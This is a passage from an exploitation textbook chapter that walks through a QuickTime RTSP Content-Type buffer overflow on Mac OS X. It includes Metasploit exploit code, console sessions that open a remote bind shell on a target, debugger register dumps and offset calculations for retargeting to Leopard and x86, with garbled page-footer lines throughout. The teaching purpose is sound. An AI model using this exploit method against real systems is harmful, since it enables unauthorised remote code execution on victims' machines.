“Content-Type: #{boom}\r\n”+
“Content-Length: #{body.length}\r\n\r\n”
client.put(header + body)
handler(client)
end
For the fi nal test, we will launch the full Metasploit exploit module with a
real payload and see whether it works.
% ./msfconsole
_ _ _ _
| | | | (_) |
_ __ ___ ___| |_ __ _ ___ _ __ | | ___ _| |_
| ‘_ ` _ \ / _ \ __/ _` / __| ‘_ \| |/ _ \| | __|
| | | | | | __/ || (_| \__ \ |_) | | (_) | | |_
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|
| |
|_|
=[ msf v3.2-release
+ -- --=[ 308 exploits - 172 payloads
+ -- --=[ 20 encoders - 6 nops
=[ 67 aux
msf > set LHOST 10.13.37.96
LHOST => 10.13.37.96
msf > set RHOST 10.13.37.98
RHOST => 10.13.37.98
msf > use exploit/osx/quicktime/rtsp_content_type
msf exploit(rtsp_content_type) > set PAYLOAD osx/ppc/shell_bind_tcp
PAYLOAD => osx/ppc/shell_bind_tcp
9955336633cc1100..iinndddd 226688 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 269
msf exploit(rtsp_content_type) > set ENCODER ppc/longxor
ENCODER => ppc/longxor
msf exploit(rtsp_content_type) > exploit
[*] Started bind handler
[*] Server started.
msf exploit(rtsp_content_type) >
[*] Command shell session 1 opened (10.13.37.96:53569 ->
10.13.37.98:4444)
id
uid=501(ddz) gid=501(ddz) groups=501(ddz), 81(appserveradm),
79(appserverusr), 80(admin)
pwd
/
exit;
[*] Command shell session 1 closed.
We can see that our exploit did work and gave us a remote command shell
on the target host.
Note that our exploit used only one magic memory address. To port it to
other targets, we need only to fi nd an appropriate memory address to redirect
execution indirectly into r27 or r28. In some cases it may be possible to fi nd
values that rarely change across operating system or QuickTime releases, but
we leave that as an exercise for you.
Retargeting to Leopard (PowerPC)
Leopard 10.5.0 shipped with a different version of QuickTime (7.2.1), and retar-
geting the exploit requires just a few changes. In particular, the offset to the
return address within the attack string differs, as do the registers that used
to point within our attack string. If we attempt our exploit while debugging
QuickTime Player, we can see these differences.
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x41753540
0x41753540 in ?? ()
(gdb) info reg
r0 0x41753541 1098200385
r1 0xbfffcae0 3221211872
r2 0x0 0
r3 0xffffeae6 4294961894
r4 0xffffeae6 4294961894
r5 0x65727220 1701999136
9955336633cc1100..iinndddd 226699 11//2255//0099 44::4422::4477 PPMM
270 Part III ■ Exploitation
r6 0x0 0
r7 0x1 1
r8 0x1 1
r9 0x93f1ddf0 2482101744
r10 0xbfffc788 3221211016
r11 0x696e5bc 110552508
r12 0x68683f0 109478896
r13 0x40000000 1073741824
r14 0x0 0
r15 0x4ed0380 82641792
r16 0xbfffd574 3221214580
r17 0xbfffd56c 3221214572
r18 0x0 0
r19 0xa033f94c 2687760716
r20 0xbfffd598 3221214616
r21 0x41733541 1098069313
r22 0x73364173 1932935539
r23 0x37417338 927036216
r24 0x41733941 1098070337
r25 0x74304174 1949319540
r26 0x31417432 826373170
r27 0x41743341 1098134337
r28 0x74344174 1949581684
r29 0x35417436 893482038
r30 0x41743741 1098135361
r31 0x74384174 1949843828
pc 0x41753540 1098200384
ps 0x4200f030 1107357744
cr 0x44242422 1143219234
lr 0x41753541 1098200385
ctr 0x68683f0 109478896
xer 0x7 7
mq 0x0 0
fpscr 0x86024000 2248294400
vscr 0x10001 65537
vrsave 0x0 0
(gdb) x/x $r20
Cannot access memory at address 0x41753540
Cannot access memory at address 0x41753540
Cannot access memory at address 0x75324175
0xbfffd598: 0xbfffd774
(gdb) x/x $r17
0xbfffd56c: 0xbfffd744
(gdb) x/x $r16
0xbfffd574: 0x00000000
(gdb) x/x $r10
0xbfffc788: 0x00100100
(gdb) x/x $r1
0xbfffcae0: 0x75324175
(gdb) x/s $r1
0xbfffcae0: “u2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av
9955336633cc1100..iinndddd 227700 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 271
9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay
3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4
Ba5Ba6Ba7Ba8”
…
Currently, only r1 points into our attack string, but r16, r17, and r20 point within
2,700 bytes of it. If we increase the size of our pattern string to 5,000 bytes and
launch our exploit again, these registers will point within the attack string.
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x41753540
0x41753540 in ?? ()
(gdb) x/x $r16
Cannot access memory at address 0x41753540
Cannot access memory at address 0x41753540
Cannot access memory at address 0x75324175
0xbfffd574: 0x45673545
(gdb) x/x $r17
0xbfffd56c: 0x67324567
(gdb) x/x $r20
0xbfffd598: 0x45683745
(gdb)
We can use the same disassembly grep method to find a useful return
address again.
$ otool -tv /usr/lib/dyld | grep -A 1 -E ‘mtspr.*(r16|r17|r20)’
8fe042e0 mtspr ctr,r20
8fe042e4 bctrl
…
We now have the following exploit method:
def on_client_connect(client)
boom = Rex::Text.pattern_create(5000)
boom[615, 4] = [target[‘bl_r20’]].pack(‘N’)
boom[3351, payload.encoded.length] = payload.encoded
body = “ “
header =
“RTSP/1.0 200 OK\r\n”+
“CSeq: 1\r\n”+
“Content-Type: #{boom}\r\n”+
“Content-Length: #{body.length}\r\n\r\n”
client.put(header + body)
handler(client)
end
9955336633cc1100..iinndddd 227711 11//2255//0099 44::4422::4477 PPMM
272 Part III ■ Exploitation
Finally we verify that the full exploit works by running it through Metasploit and
loading the malicious RTSP URL in QuickTime Player on the target machine.
% ./msfconsole
888 888 d8b888
888 888 Y8P888
888 888 888
88888b.d88b. .d88b. 888888 8888b. .d8888b 88888b. 888 .d88b. 888888888
888 “888 “88bd8P Y8b888 “88b88K 888 “88b888d88””88b888888
888 888 88888888888888 .d888888”Y8888b.888 888888888 888888888
888 888 888Y8b. Y88b. 888 888 X88888 d88P888Y88..88P888Y88b.
888 888 888 “Y8888 “Y888”Y888888 88888P’88888P” 888 “Y88P” 888 “Y888
888
888
888
=[ msf v3.2-release
+ -- --=[ 308 exploits - 172 payloads
+ -- --=[ 20 encoders - 6 nops
=[ 67 aux
resource> set LHOST 10.13.37.96
LHOST => 10.13.37.96
resource> set RHOST 10.13.37.98
RHOST => 10.13.37.98
resource> set PAYLOAD osx/ppc/shell_bind_tcp
PAYLOAD => osx/ppc/shell_bind_tcp
resource> set ENCODER ppc/longxor
ENCODER => ppc/longxor
resource> use exploit/osx/quicktime/rtsp_content_type
msf exploit(rtsp_content_type) > exploit
[*] Started bind handler
[*] Server started.
msf exploit(rtsp_content_type) >
[*] Command shell session 1 opened (10.13.37.96:55124 ->
10.13.37.98:4444)
uname -a
Darwin MacMini.local 9.0.0 Darwin Kernel Version 9.0.0: Tue Oct 9
21:37:58 PDT 2007; root:xnu-1228~1/RELEASE_PPC Power Macintosh
id
uid=501(ddz) gid=20(staff) groups=20(staff),98(_lpadmin),101(com.apple.
sharepoint.group.1),81(_appserveradm),79(_appserverusr),80(admin)
pwd
/
exit
[*] Command shell session 1 closed.
msf exploit(rtsp_content_type) >
9955336633cc1100..iinndddd 227722 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 273
Exploitation on x86
Whereas on PowerPC we could execute our code directly from the stack, we
cannot do so on x86. This will give us an opportunity to use one of our tricks
from Chapter 7, “Exploiting Stack Overfl ows”: a payload stub that copies our
payload to the heap and executes it from there.
Again we begin with a minimalist exploit method that just uses a long pat-
tern string to trigger the vulnerability and allow us to calculate the offsets of
critical attack string elements.
def on_client_connect(client)
boom = Rex::Text.pattern_create(5000)
body = “ “
header =
“RTSP/1.0 200 OK\r\n”+
“CSeq: 1\r\n”+
“Content-Type: #{boom}\r\n”+
“Content-Length: #{body.length}\r\n\r\n”
client.put(header + body)
handler(client)
end
We launch QuickTime Player, attach a debugger, and then load the exploit
RTSP URL.
% ps auxww | grep QuickTime
user 1431 10.5 2.6 303756 26964 ?? S 9:17PM
0:05.71 /Applications/QuickTime Player.app/Contents/MacOS/QuickTime
Player -psn_0_254014
% gdb -p 1431
GNU gdb 6.3.50-20050815 (Apple version gdb-768) (Tue Oct 2 04:07:49
UTC 2007)
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and
you are
welcome to change it and/or distribute copies of it under certain
conditions.
Type “show copying” to see the conditions.
There is absolutely no warranty for GDB. Type “show warranty” for
details.
This GDB was configured as “i386-apple-darwin”.
/Users/user/1431: No such file or directory.
Attaching to process 1431.
Reading symbols for shared libraries . done
Reading symbols for shared libraries
........................................................................
...................................... done
0x9594c8e6 in mach_msg_trap ()
9955336633cc1100..iinndddd 227733 11//2255//0099 44::4422::4477 PPMM
274 Part III ■ Exploitation
(gdb) cont
Continuing.
Reading symbols for shared libraries . done
Reading symbols for shared libraries . done
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x6b413695
0x0d4f61c5 in _EngineNotificationProc ()
(gdb) x/i $eip
0xd4f61c5 : mov 0x2a(%eax),%eax
(gdb) p /x $eax
$1 = 0x6b41366b
(gdb)
You can see that the process failed trying to write to a memory address that
we can control. As before, we calculate the offset of the element within the
attack string.
% ./tools/pattern_offset.rb 0x6b41366b 5000
319
Now we will place a writable memory address at offset 319 of our attack
string and try again.
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x386b420f
0x0d4f61eb in _EngineNotificationProc ()
(gdb) x/i $eip
0xd4f61eb : movb $0x1,0xd8(%ecx)
(gdb) p /x $ecx
$1 = 0x386b4137
Again we calculate the offset of this memory address (323) and adjust our
attack string so that there is a readable memory address at offset 323. In this case
we may simply reuse the writable memory address we used previously since it
is obviously also readable. When we launch the exploit again, we will see that
we now have direct control over EIP and the execution of the process.
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x6b41326b
0x6b41326b in ?? ()
(gdb) info registers
eax 0xffffeae6 -5402
ecx 0x346b4133 879444275
edx 0x0 0
ebx 0x41376a41 1094150721
esp 0xbfffd450 0xbfffd450
ebp 0x41316b41 0x41316b41
esi 0x6a41386a 1782659178
9955336633cc1100..iinndddd 227744 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 275
edi 0x306b4139 812335417
eip 0x6b41326b 0x6b41326b
eflags 0x10286 66182
cs 0x17 23
ss 0x1f 31
ds 0x1f 31
es 0x1f 31
fs 0x0 0